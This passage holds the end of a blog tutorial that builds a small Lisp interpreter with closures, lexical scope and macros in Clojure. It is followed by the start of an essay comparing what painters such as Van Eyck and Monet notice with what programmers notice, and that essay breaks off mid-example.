If we receive this `def` form, we'd just update our environment, to
point the symbol `second-fav` to whatever the evaluation of
`(+ 1 fav-num)` would be.

### Evaluating def

That sounds like a plan. Let's detect this form first:

\[code\]

    (def def? (partial seq-starts-with? 'def))

\[/code\]

And update `eval` to handle it:

\[code\]

    (defn eval [env form]
      (cond
        (literal? form) form
        (quote? form) (second form)
        (symbol? form) (lookup-symbol env form)
        (def? form) (eval-def env form)
        :else (eval-application env form)))

\[/code\]

And here's all `eval-def` would need to do:

\[code\]

    (defn eval-def [env [_ k v]]
      (assert (symbol? k) (format "expected k = %s to be a symbol" k))
      (.put (:globe env) k (eval env v)))

\[/code\]

Here, we know the first argument to `def` is the symbol, `k`. The second
is the *value* `v` we want to save. So, we update our environment's
`globe` Hashmap, and point the symbol `k`, to whatever `(eval env v)`
is. In our case, `k` would be `second-fav`, `v` would be
`(+ 1 fav-num)`, and `(eval env v)` would become `42`.

Prettyy cool, this works!

\[code\]

    (let [e (env)] 
        (eval e (read-string "(def second-fav (+ 1 fav-num))"))
        (eval e (read-string "second-fav")))
    ; => 
    42

\[/code\]

### Introducing if

Okay, let's implement one more special form. We need something to handle
conditional logic:

\[code\]

    (if (= fav-num 41) 'yess 'noo))

\[/code\]

When we get `if`, we'll can evaluate the test form: `(= fav-num 41)`. If
that's true, we'll then evaluate the true case `'yess`. Otherwise, we'll
evaluate the false case: `'noo`. Sounds like a plan.

### Evaluating if

To implement if, as usual let's detect it first:

\[code\]

    (def if? (partial seq-starts-with? 'if))

\[/code\]

Then use it in `eval`:

\[code\]

    (defn eval [env form]
      (cond
        (literal? form) form
        (quote? form) (second form)
        (symbol? form) (lookup-symbol env form)
        (def? form) (eval-def env form)
        (if? form) (eval-if env form)
        :else (eval-application env form)))

\[/code\]

And here's what `eval-if` could look like:

\[code\]

    (defn eval-if [env [_ test-form when-true when-false]]
      (let [evaled-test (eval env test-form)]
        (eval env (if evaled-test when-true when-false))))

\[/code\]

Just a few lines, following our description to a tee. We see if
`evaled-test` is true. Then, we either evaluate `when-true`, or
`when-false`.

While we're at it, let's add a bunch of nice primitive functions in our
`env`:

\[code\]

    (defn env [] {:globe (HashMap. {'+ + '= = 'list list 'map map 'concat concat
                                    'first first 'second second 'not not 'fav-num 41})})

\[/code\]

And bam. Our little interpreter can do quite a lot now!

\[code\]

        (eval (env) (read-string "(if (= fav-num 41) 'yess 'noo)"))
        ; => yess

\[/code\]

### Introducing Functions

Let's take things up a notch. We have Clojure's `+` and so on, but what
if our programmer wanted to write *their own* functions? Here's an
example:

\[code\]

    ((clo (x) (+ x fav-num) 2))

\[/code\]

Here, the programmer wrote a function that takes `x` and adds `fav-num`
to it.

Say they wrote this. How can we run their function? Well, their
definition has an `arguments` and a `body`. In this case, it's `(x)` and
`(+ x fav-num)` respectively. In this example, the function is called
with `2`.

Here's the insight: If we could just evaluate `(+ x fav-num)`, in an
environment where `x` points to `2`, voila, it'll be like we *ran* the
function! Here's a diagram to explain the idea:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc2OC00MzBkN2ZjMC05MDQyLTQ0ZGUtYmYyOS0zNjM4ZjA5YTllYzkucG5n)

How can we point `x` to `2`? We can't just update our our `globe`
Hashmap, because then `x` would be *permanently* set to `2`, even when
the `body` was done evaluating.

So we want a new idea. A `scope`. We can think of `scope` as an
environment, where the changes we make only last while `body` is being
evaluated. If we can introduce a concept like this, we'll have
functions!

### Evaluating Functions

Okay, let's get this to work. First, let's make sure that if someone
writes `(clo (x) (+ x 1))`, we don't actually try to `eval-application`.
Instead, we should treat this as a new `closure` literal.

We can detect it:

\[code\]

    (def closure? (partial seq-starts-with? 'clo))

\[/code\]

And update our `literal?`:

\[code\]

    (def literal?
      (some-fn string? number? boolean? char? nil? fn? closure?))

\[/code\]

Now, if a user just writes a function, it'll return itself:

\[code\]

    (eval (env) (read-string "(clo (x) (+ x fav-num))"))
    ; => (clo (x) (+ x fav-num))

\[/code\]

Next, let's update our `environment`, to have a new `scope` map:

\[code\]

    (defn env [] {:globe (HashMap. {'+ + '= = 'list list 'map map 'concat concat
                                    'first first 'second second 'fav-num 41})
                  :scope {}})

\[/code\]

And let's update `lookup-symbol`, to *also* look up variables in scope:

\[code\]

    (defn lookup-symbol [{:keys [globe scope]} sym]
      (let [v (some (fn [m] (when (contains? m sym) [(get m sym)]))
                    [globe scope])]
        (assert v (format "expected value for sym = %s" sym))
        (first v)))

\[/code\]

Closer and closer. Now let's make it run. If we wrote this:

\[code\]

    ((clo (x) (+ x fav-num)) 1)

\[/code\]

This list would go to `eval-application`. Let's update it:

\[code\]

    (defn eval-application [env [f & args]]
      (let [f-evaled (eval env f)]
        (cond
          (fn? f-evaled) (apply f-evaled (eval-many env args))
          (closure? f-evaled) (eval-closure env f-evaled (eval-many env args)))))

\[/code\]

`f-evaled` would be `(clo (x) (+ x fav-num))`. This would mean
`(closure? f-evaled)` would become true.

We'd evaluate every argument with `(eval-many env args)`, which would be
`(1)`, and give this off to `eval-closure`. Here's how `eval-closure`
could look:

\[code\]

    (defn eval-closure [env [_ syms body] args]
      (eval (assoc env :scope (assign-vars syms args)) body))

\[/code\]

We'd do exactly as we did in the diagram. We'd get `syms`, which would
be `(x)`, and `args`, which would be `(1)`. We'd then create a new
scope:

\[code\]

    (defn assign-vars [syms args]
      (assert (= (count syms) (count args))
              (format "syms and args must match syms: %s args: %s"
                      (vec syms) (vec args)))
      (into {} (map vector syms args)))

\[/code\]

That's `{x 2}`. We'd merge it into our environment, and then evaluate
`body`.

All of a sudden, `(+ x fav-num)` will become `43`!

\[code\]

    (eval (env) (read-string "((clo (x) (+ x fav-num)) 2)"))
    ; => 43

\[/code\]

### Introducing Lexical Scope

Now, these functions are fine and all, but we can do *more.* Many
languages support lexical scoping. For example, we can do this in
javascript:

\[code\]

    const makeAdder = (n) => (a) => n + a
    const addTwo = makeAdder(2);
    addTwo(4) 
    // => 
    6

\[/code\]

Here, `makeAdder` returned a function. This function remembered the
value of `n` *where it was defined*. How can we make this work in our
own language?

Okay, first things first, let's say that we let the programmer see the
current scope. Here's an example of what I mean:

\[code\]

    ((clo (x) scope) 2)
    ; => 
    {x 2}

\[/code\]

This special `scope` symbol, when evaluated returned `{x 2}`, the
*current* scope!

Nice now, what if we updated our function literal? It could look
something like this:

\[code\]

    (clo {n 2} (a) (+ n a))

\[/code\]

Here, we have a special spot for the `scope`! When we define the
function, if we could just "plop" the scope of wherever it was defined
in there, badabing badaboom, we'd support lexical scoping!

Here's how our `make-adder` could work:

\[code\]

    (def make-adder (clo nil (n) 
                      (list 'clo scope '(y) '(+ y n)))) 
    (def add-two (make-adder 2))
    (add-two 4)
    ; => 
    6

\[/code\]

When we run `(make-adder 2)` we'd evaluate
`(list 'clo scope '(y) '(+ y n))`. That would return
`(clo {n 2} (y) (+ y n))`! All of a sudden, we support lexical scoping.

You may think it's weird that we wrote
`(list 'clo scope '(y) '(+ y n)))` --- quote verbose. But, hey, we'll
support macros soon, and that help us write this in a spiffy way. Just
you wait 🙂.

### Implementing Lexical Scope

Okay. that's a lot of explaining, but the changes will be simple. First
we need to make sure that if we get a `scope` symbol, we return the
current scope:

\[code\]

    (defn lookup-symbol [{:keys [globe scope]} sym]
      (let [v (some (fn [m] (when (contains? m sym) [(get m sym)]))
                    [{'scope scope} globe scope])]
        (assert v (format "expected value for sym = %s" sym))
        (first v)))

\[/code\]

And now all we need to do, is to update `eval-closure`:

\[code\]

    (defn eval-closure [env [_ scope syms body] args]
      (eval (assoc env :scope (merge scope (assign-vars syms args))) body))

\[/code\]

Here we take the `scope` *from* the closure itself! With that, lexical
scoping works!

\[code\]

    (((clo nil (x)
            (list 'clo scope '(y) '(+ y x))) 2) 4)
    ; => 
    6

\[/code\]

### Introducing Macros

Now, we have all we need to implement macros! Let's think about what
macros really are.

Imagine writing the function `unless`:

\[code\]

    (def unless (clo nil (test v)
                  (if (not test) v)))

\[/code\]

Will it work? If we ran `(unless (= fav-num 41) 'yes)`, it *would*
return the symbol `yes`.

But what if we ran this?

\[code\]

    (unless (= fav-num 41) (throw-error))

\[/code\]

Since `unless` is a function, we would evaluate each argument first
right? In that case, we'd evaluate `(= fav-num 41)`, which would be
`true`. But, we'd *also* evaluate `(throw-error)`. That would break our
program. This defeats the whole purpose of `unless` , as `(throw-error)`
was supposed to run *only* when `test` was false.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc3Mi1hNTlmNGJkOC1mNDc1LTQxMGMtODFmYi02YWI2NjlhNDY1OTEucG5n)

Now, imagine we wrote the *macro* unless:

\[code\]

    (def unless (mac (clo nil (test v)
                        (list 'if (list 'not test) v))))

\[/code\]

If we ran `(unless (= fav-num 41) (throw-error))`, here's what would
happen:

The value of `test` would not be `true`, it would actually be the list
`(= fav-num 41)`. Similarly, we wouldn't evaluate `(throw-error)` . `v`
would just be the actual list `(throw-error)`.

*The arguments to a macro are not evaluated.* When the macro runs, it
returns *code.* The result of

\[code\]

    (list 'if (list 'not test) v))

\[/code\]

would become

\[code\]

    (if (not (= fav-num 41)) (throw-error))

\[/code\]

And when we evaluated *that,* things would work as expected!
`(throw-error)` would never evaluate.

This is the key difference between functions and macros. Functions take
*evaluated values* as arguments and return evaluated values. Macros
receive *unevaluated* arguments, return *code, and that code is
evaluated.*

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc3OS1mMDMxNWQyNS1lZjZlLTQzYjktOTBiNy1jMmYyMDE2YTkyOGIucG5n)

An important piece to note is that we eval *twice.* We give the macro
the unevaluated arguments, which returns new code, and we once again
*evaluate* that.

So, how can we support this?

### Evaluating Macros

So much explanation, for such little code. Are you ready? Let's add
macros.

First, let's use this new structure for a macro: a macro is a list that
begins with `mac`, and has closure inside:

\[code\]

    (mac (clo nil (...))

\[/code\]

We can detect macro, and mark it as a literal:

\[code\]

    (def macro? (partial seq-starts-with? 'mac))
        
    (def literal?
      (some-fn string? number? boolean? char? nil? fn? closure? macro?))

\[/code\]

Next, we'll want to update `eval-application`:

\[code\]

    (defn eval-application [env [f & args]]
      (let [f-evaled (eval env f)]
        (cond
          (fn? f-evaled) (apply f-evaled (eval-many env args))
          (closure? f-evaled) (eval-closure env f-evaled (eval-many env args))
          (macro? f-evaled) (eval-macro env f-evaled args))))

\[/code\]

Before we always ran `(eval-many env args)`. But this time, if it's a
macro, we pass in `args` directly! That's the "code" itself 🙂.

And now for `eval-macro`:

\[code\]

    (defn eval-macro [env [_ clo] args]
      (eval env
            (eval env (concat [clo] (map (partial list 'quote) args)))))

\[/code\]

Oh my god. 3 lines!! We do exactly as we said in our diagram:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc5MC02MWFhOTQ5OC05NDgzLTQ4ODYtOGRiMC1lYmM3NzE1OTM2MzkucG5n)

We take the "closure" out of our macro, and *run* it with *unevaluated*
args. We can do that just by wrapping each `arg` in a quote:
`(map (partial list 'quote) args)`.

Once we have the resulting code, we *evaluate* that again, and boom, we
have macros.

\[code\]

    (def unless (mac (clo nil (test v)
                        (list 'if (list 'not test) v))))
    ; works!
    (unless (= fav-num 41) (throw-error))

\[/code\]

## Your own Macros

Okay, we have a Lisp that supports macros. Let's go ahead and write some
of our own!

### defmacro

Let's get meta off the bat. Notice what we do when we define a macro:

\[code\]

    (def unless (mac (clo nil (test v)
                          (list 'if (list 'not test) v))))

\[/code\]

This whole `(mac (clo nil …))` business is a bit unnecessary. Let's just
write macro that does this for us!

\[code\]

    (def defmacro
          (mac (clo nil (n p e)
                    (list 'def n
                          (list 'mac (list 'clo nil p e))))))

\[/code\]

This generates the code `(def n (mac (clo nil …)))`. Now we could write:

\[code\]

    (defmacro unless (test v) 
      (list 'if (list 'not test) v))

\[/code\]

Cool!

### fn

Okay, remember how we wrote our function for lexical scoping?

\[code\]

    (def make-adder (clo nil (n)
                          (list 'clo scope '(y) '(+ y n))))

\[/code\]

Let's have a macro write this for us:

\[code\]

    (defmacro fn (args body)
                  (list 'list ''clo 'scope
                        (list 'quote args)
                        (list 'quote body)))

\[/code\]

Here's what happens if we wrote:

\[code\]

    (def make-adder (clo nil (n)
                        (fn (y) (+ y n))))

    (def add-two (make-adder 2))

\[/code\]

When the macro expansion for `fn` runs, the `args` would would be `(y)`
and `body` `(+ y n)`. So

\[code\]

    (list 'list ''clo 'scope
          (list 'quote args)
          (list 'quote body))

\[/code\]

would expand to

\[code\]

    (list 'clo scope '(y) '(+ y n))

\[/code\]

and that's *exactly* what we wrote by hand! Bam, now we can use `fn`
instead of this whole `'clo scope` business.

### defn

Now if we wanted to define functions, we could write:

\[code\]

    (def add-fav-num (fn (x) (+ x fav-num)))

\[/code\]

But we can make it tighter. Let's add a `defn` macro, so we could write:

\[code\]

    (defn add-fav-num (x) (+ x fav-num))

\[/code\]

Easy peasy:

\[code\]

    (defmacro defn (n args body)
      (list 'def n (list 'fn args body)))

\[/code\]

### let

One more cool macro. Right now, there's no real way to define temporary
variables. Something like:

\[code\]

    (let ((x 1) (y 2)) 
      (+ x y))
    ; => 
    3

\[/code\]

How could we support it? Well, what if we *rewrote* `(let …)` to:

\[code\]

    ((fn (x y) (+ x y)) 1 2)

\[/code\]

We could just use the argument list of a function to create these
variables! Perfecto. Here's the macro:

\[code\]

    (defmacro let (pairs body)
      (concat (list (list 'fn (map first pairs) body))
                    (map second pairs)))

\[/code\]

## Fin

What a journey. 80 lines, 4000 words, and hopefully a fun time 🙂. You
now have a Lisp with macros, and you've written some cool ones yourself.
Here's the [full
source](https://github.com/stopachka/llisp/blob/main/src/llisp/core.clj)
if you'd like to follow along from there.

**Credits**

The idea to represent macros and closures like this, came from PG's
[Bel](http://www.paulgraham.com/bel.html).

*Thanks to Mark Shlick, Daniel Woelfel for reviewing drafts of this
essay.*

# What Artists Notice

## Painters

Painters at work notice details we'd ignore. From those details they
develop delightful insights into reality. What do I mean? Let's take a
gander at Van Eyck's "Arnolfini Portrait" to find out:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTAxMi0wOTFiNDBmZi00MTdmLTQ0NjktODJmNi1mMDlhZjVjNWZjNDkucG5n)

Arnolfini Portrait, Jan van Eyck

## Attention

The most whimsical idea starts with *what* Van Eyck painted. Do you
think anyone in the world has paid more attention to this room than Van
Eyk has? Look at the prayer beads beside the mirror:

### Beads

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTA2MS1kYjg2MWNiNS1iMzljLTQ0YTUtYmE4Yy1kMTQ0ODg0MjkwNmUucG5n)

Prayer beads

Don't they seem uncannily real? Imagine the kind of detail he'd have to
notice to get the beads this right. The more you look, the more details
you uncover. Notice how rich the wife's dress is: the intricate folds,
the patterns, the material. I'm not sure anyone but the dressmaker could
have scrutinized it with more care. And even the dog is gifted with
attention; look at its fur!

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTE3MC1hMDcwYjdmZC03NDZjLTRlMWItOTNmOS1lNzMyYjNmZjJmOGMucG5n)

The doggo

Try it yourself \[1\]. Pick a random spot and zoom into the painting.
You'll discover a world of detail you hadn't seen. From here, it's safe
to say that at least Van Eyck noticed details we'd ignore.

### Monet

But is this true for all painters? Van Eyck was known to bring his
paintings to life with layers of detail. How about someone like Monet,
who didn't follow that strategy? Let's look at his water lilies:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTIyNy03YjVmMmZlMy03Zjc3LTRiNDctYWE0Yy0yODcwYmZjMDVlODcucG5n)

Water Lilies, Claude Monet

You'd be surprised. Monet actually created 250 paintings of water lilies
in the *same* pond, to study the effect of light there. You saw 1 of
250, a devotion that engrossed close to three decades of his life. How
much more do you think you'd see in a pond of water lilies, if you spent
30 years looking?

Our brains ignore details and see the essence of things. We barely
notice the prayer beads, and wouldn't take more than a few glances at
the reflection of water lilies. The brush, however, forced Van Eyck and
Monet to stop and see more. From there is born the premise that painters
notice details we'd ignore.

## Insight

Now details by themselves, although interesting, aren't general. Who
cares if Van Eyck was intimately aware of prayer beads or if Monet had a
deeper understanding of a pond? Let's zoom out and see some of the
larger implications. Back to the Arnolfini Portrait:

### Fruit

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTI3Mi1jMGM1YTAwNi02MjhhLTQ2NDEtYjlkNi1iYjhjYTE1ZTQxMDgucG5n)

What\'s up with the fruit?

Why is there fruit by the window? How about the clogs? Do you see all
the various symmetrical arrangements: the bead and the broom, the grey
clogs and the red clogs, the couple's position? And what about the
colors? Why is the husband wearing a dark purple coat, and not a red
one? Look at the wife's gesture. It's so maidenly, but why?

### Subconscious

PG originally shared this idea in a masterful essay \[2\], and I'll
adopt it here. Every painting Van Eyck made had a purpose; to *affect*
his audience. He may have wanted to please, shock, or dazzle; the
spectrum of human emotions were fully available to him. This also meant
that every painting worked doubly as a test; did it achieve its purpose?
The more Van Eyck painted, the more he discovered exactly what worked.

Slowly but surely details amalgamated into patterns, and Van Eyck began
to map our subconscious drivers. He discovered our inborn love of
symmetry for example, and used it to masterful advantage throughout the
painting. He discovered the gestures that make us feel innocence, and
now we can't help but see it in the wife. \[3\]

When we look at his work, feelings and thoughts burgeon up, but we can't
put our finger on *why.* Well, Van Eyck could put his finger on why, and
there comes the painter's first insight: *they learn what affects
humans.*

Already we hit an interesting philosophical plane. When you learn what
affects humans, you're bound to ask why. But it gets grander.

## Reality

I left the coolest part of this painting last. Look at the mirror:

### Mirror

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTMyOC04YWEzZTc4NS1jNjAxLTQ3OWMtOTBmYS04MjZiOTEwMjNkYTUucG5n)

Hacker level 1000

Van Eyk painted the reflection! You can even see two folks peering back
at the couple. \[4\]

Outside the effort this must have taken, imagine what Van Eyck learned.
How deeply have you thought about how light reflects in convex mirrors?
I'd bet a lot less than Van Eyck after this painting. In fact, some have
tried to see just how accurate Van Eyck was, and compared his depiction
with what a real convex mirror would have reflected \[5\]:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2NTM0NjExNi1iODJlYjlkYi0zMzEzLTRlOTctYjAxMi0wYWM3NDQ5Yzg3ZjYucG5n)

Van Eyck vs reality

*a* is Van Eyck's work, and *d* is the mathematically correct version.
The similarity is remarkable.

### Nature

Not only did Van Eyck have to learn what affected humans, but the brush
forced him to see deeply into the real world. The mirror is just the
beginning. Imagine what he learned trying to draw the shadows. What
about the chandelier? Here we hit the painter's second insight: *they
learn to unravel the secrets of nature.*

## Transcendence

As a painters master these insights, they take the canvas to heights we
couldn't have imagined before. For example, look at Botticelli's "The
Birth of Venus"

### Venus

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTUwNi0xZjgwY2Y2Mi1mMDBkLTRjNDgtOTdkMy1lYzMxY2YyYzliNTAucG5n)

Birth of Venus, Sandro Botticelli

Stuff like symmetry here is obvious. But, glance over Venus' neck:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTU4MS0yMWQ1MzQ4ZC00MWQ4LTQzZDgtODVhMC0wNGJhNTFkMDFkYjUucG5n)

What's up with the neck?

It's longer than a normal human neck! Or look at her hands and
shoulders, a bit lower and longer than normal. Botticelli hacked our
minds. He knew what pushed our buttons, so he didn't just describe
reality, he accentuated it. He showed us a view of Venus's elegance that
could only be achieved through painting. \[6\]

### Redefinition

Eventually, painters can eschew reality's constraints in ground-breaking
ways, and show us what our eyes could never see:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTYzMy02ZjVlZmUyNi03ZDUwLTRhZTctYjc1Ny0xNDNmMDZhMjhlYzAucG5n)

Starry Night, Van Gogh

These insights touch on what makes painting *art.* Painting isn't a rote
exercise, but an inquiry into reality and perception.

------------------------------------------------------------------------

## Programmers

Here's a jump: I think programmers have a similar experience \[7\].
Programmers at work notice details we'd ignore. From those details they
develop delightful insights into reality.

Now, programming is not as far along as painting yet; our art has just
begun. Like painting in the early renaissance, our work is crude, but
we're accruing insight after insight. What are these insights?

Let's find out by answering a question: what would a programmer notice
if they made an *app* for painters? We'll call it pixel.fyi, and we'll
help painters draw stuff online. Here's our goal:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTY3OC1hNThiZDhkMS1jYzA3LTQ3YjYtOGJiMC04N2VkN2FlOGY0ZGEucG5n)

The Goal

## Origins

Before we get into what programmers notice, let's learn what programmers
*do*. Today our devices are so sophisticated that they seem intelligent,
as though they "understand" what we want from them.

However, this intelligence is an illusion built upon illusions, and is
perhaps the masterwork of the pioneer programmers of our time. Computers
aren't intelligent. Instead, they do simple things, like add and
subtract numbers, *very* quickly.

### Adding Machine

To a get sense, here's the great-great-grandfather of our modern
computer:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTczMC04ZTBhZTZmMi02Y2U5LTQ2NzQtOTlmNC03YTA5NDM4ZjhhYWMucG5n)

Adding Machine

Here we have three light switches labeled "1", "2", and "3". We also
have three light bulbs labeled "3", "4", and "5".

Now, would it be possible to wire things up so that if someone turned on
our "1" and "2" light switch, the "3" light bulb would turn on?

It doesn't seem so difficult, and we'd hardly call it intelligence, but
if we did this we would have created a machine that could *add* 1 and 2!

### Speed

That's cool, but here's something startling: though crude, our invention
adds numbers faster than any human ever could. The answer comes at the
speed of light through a wire; this means our machine can make
*millions* of calculations by the time you finish this sentence.

### Language

Interestingly, our machine also has the same advantage as modern
computers, in that the answer comes quickly, and the same disadvantage,
in that fundamentally there is no intelligence.

So what's the big difference? Our machine is specific; it can *only* add
1 to 3. Modern computers are general; they can do any computation.
Instead of wiring things up a specific way, modern computers let us use
a computer language to *simulate* wiring things up in any way we like.
It looks something like this:

\[code\]

    if light_switch_1 is on and light_switch_2 is on:
      turn_on(bulb_3)

\[/code\]

With that code, it's as though we "wired up" our great-great-grandfather
machine!

We come to the essence of what programmers do. They write precise
instructions in a computer language, to get computers to solve problems.
*Precise* is the key word here, because at the end of the day it all
boils down to switches that turn on and off.

## Attention, II

Okay, back to programmers today. The most whimsical idea starts with
*what* they create. For example, in order for pixel.fyi to work, at the
very least we need to let our users draw simple shapes, like circles or
squares.

### Circles

Well, how would a computer draw a circle? Switches have no concept of
"circle". Here's one idea:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTc3OS1mOTE4YTA2OS1mMmQ3LTQyNTAtYWYwMS1hNTNmMmUzY2M2M2MucG5n)

Circle

Let's imagine the monitor is like a grid, where we can turn each pixel
on or off. A circle is really *all* the pixels that are a specific
distance away from a center point. If we could just figure out all the
pixels to turn on, we'd have a circle!

### Trigonometry

And how do we figure out those pixels? Let's remember some math:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTgzMC1jY2Y0NDA5ZS0wMzI3LTRjNjktYmFhMi01ODYyMTcxYmMzNWMucG5n)

Trig

We could draw a right-angle triangle going from the center to a point on
our circle at any particular degree. We can then use trigonometry to
find the x and y coordinates for the point! All of a sudden, we have a
plan to draw a circle. Here's how a programmer could express it in a
computer language:

\[code\]

    radius = 20
    pixels = []
    for degrees in [0..360]:
      x = radius * cos(degrees)
      y = radius * sin(degrees)
      into(pixels, [x, y])
      
    turn_on(pixels)

\[/code\]

For every degree between 0 and 360, we calculate the `x` and `y`
coordinates, and we have our pixel. We can then `turn_on` pixels, and
voila, our circle is born! \[8\] Here's how this would look:

[*See the code*](https://replit.com/@StepanParunashv/Circle#script.js)

### Detail

So what's the consequence of all of this? Look how much we learned about
circles. Not only did we breath life to trigonometry, but we discovered
the "essence" of a circle: it's all the points that are equidistant from
a center. And if you think about it, this is the *same* definition for a
sphere! A sphere is all the points that are equidistant from a center in
three dimensions. And now for a mind-bender: this must mean that
"circle" exists in infinite dimensions; there's a "4-D circle", with
points equidistant from a center! \[9\]

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTkxOS1iMGRmNjU4Yy1mZDQ2LTRmODUtOTc1My03YWYwMjAxMWY1MjYucG5n)

4-D Circle?!

Our brains ignore details and see the essence of things. When we look at
circles, the only property likely to burgeon up is that they're round.
The computer language however, forced us to see more. Sound familiar?
From here is born the premise that programmers notice details we'd
ignore.

## Insight, II

Now details by themselves, though interesting, aren't general. Who cares
if we know more about circles than the average person? Well, let's zoom
out to see some of the larger implications. We can kick off with a
roundabout journey, and take a look at algebra.

### Variables

Do you remember the kind of homework you did in middle school? Stuff
like:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NTk4NC02NDZlNGY4Ny03YjRkLTQwZmItODNkYi05NWEzNDVkZTc3MDgucG5n)

x + 2 = 5

Here, `x` is 3. Now, where did `x` *come* from? When we write `x`, we
are using the concept of a *variable.* But variables didn't always
exist! They were only invented in the 16th century \[10\].

What did mathematicians do before? They used words. Instead of
`x + 2 = 5`, they would write:

> There is such a number, that when you add 2 to it, you get 5. What is
> this number?

You can already get a sense of how annoying this could become. If all
you have are sentences, even the area of a triangle can get taxing to
describe. With variables, we could write:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjAyOC1iOGQ5ZTdkOC0xM2M2LTRlZWUtOTgwYS04NDAxN2IxODg4MjMucG5n)

1/2 w \* h

Without variables, we'd be stuck with:

> Pick one side of the triangle. Measure this side. Now measure the
> straight line that connects from the opposite angle, to the side you
> chose. Multiply these two numbers together, and divide by two to get
> the area.

At some point, problems get so complicated that we can't solve them with
words anymore; no person's head could fit the space required. That's
where variables come to the rescue. `x` isn't just any mundane
character, but a shorthand for our brain: what was intractable before
can now fit into a middle schooler's head.

That\'s thrilling and begs the question: what *other* concepts exist
like this that we haven\'t discovered yet?

### Complications

Programmers think about this question all the time. Why? Let's look at
our code for clues:

\[code\]

    radius = 20
    pixels = []
    for degrees in [0..360]:
      x = radius * cos(degrees)
      y = radius * sin(degrees)
      into(pixels, [x, y])

    turn_on(pixels)

\[/code\]

We were a bit mistaken here. We assumed our center was at `[0,0]`, and
our radius was `20`. What if we wanted to draw *another* circle, but
this time with a center of `[5, 5]` and a radius of `15`?

We could write this:

\[code\]

    radius = 20
    pixels = []
    for degrees in [0..360]:
      x = radius * cos(degrees)
      y = radius * sin(degrees)
      into(pixels, [x, y])

    turn_on(pixels)

    radius_two = 15
    center_two = [5,5]
    pixels_two = []
    for degrees in [0..360]:
      x = center_two.x + radius_two * cos(degrees)
      y = center_two.y + radius_two * sin(degrees)
      into(pixels_two, [x, y])

    turn_on(pixels_two)

\[/code\]

But already this is getting hard to think about. What if we wanted to
draw a hundred different circles? We can't just keep copying and
pasting. We'd barely get to triangles before our program spilled out of
our heads.

### Snippets

We're forced to invent a new concept. Here's one; what if our language
had a "snippet"? A way for us to say `draw_circle`, with different
options for `center` and `radius`:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjA4OC0zOWNjMzE5OS03NmE4LTRiY2UtYjczMi01M2VlMWFjZDdlYzEucG5n)

draw_circle

This is how it could work:

\[code\]

    def draw_circle(center, radius):
      pixels = []
      for degrees in [0..360]:
        x = center.x + radius * cos(degrees)
        y = center.y + radius * sin(degrees)
        into(pixels, [x, y])
      pixels

    turn_on(draw_circle([0, 0], 20)) # Draws one circle
    turn_on(draw_circle([5, 5], 15)) # And another one!

\[/code\]

`def` becomes our "snippet" making concept. Whenever we write
`draw_circle(…)`, it's as though we run the code inside it, with
`center` and `radius` set differently.

Just like variables, `def` gives our minds a shorthand to think with.
Now drawing a hundred circles is easy peasy. Not only that, but wherever
someone sees `draw_circle`, they no longer need to think about how it
works; if we find a more efficient way to draw a circle for example, we
could change our snippet and nobody would be the wiser. \[11\]

### Map

`def` is just the beginning. Let's keep going. Look at `draw_circle`
again:

\[code\]

    pixels = []
    for degrees in [0..360]:
      x = center.x + radius * cos(degrees)
